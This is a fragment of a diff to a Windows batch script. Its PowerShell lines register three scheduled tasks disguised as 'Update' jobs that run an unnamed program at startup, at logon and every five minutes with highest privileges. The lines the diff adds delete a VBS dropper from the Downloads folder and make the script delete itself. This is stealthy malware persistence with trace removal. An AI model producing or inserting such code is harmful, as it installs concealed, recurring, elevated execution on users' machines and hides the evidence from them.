@@ -27,5 +27,5 @@ Register-ScheduledTask -TaskName 'Update_Startup' -Trigger (New-ScheduledTaskTri
 Register-ScheduledTask -TaskName 'Update_Logon' -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute $path) -Principal (New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest) -Force; ^
 Register-ScheduledTask -TaskName 'Update_Every5Min' -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)) -Action (New-ScheduledTaskAction -Execute $path) -Principal (New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest) -Force"
 
-
-
+del /f /q "$env:USERPROFILE\Downloads\Update\Update.vbs"
+start /b "" cmd /c del "%~f0"&exit
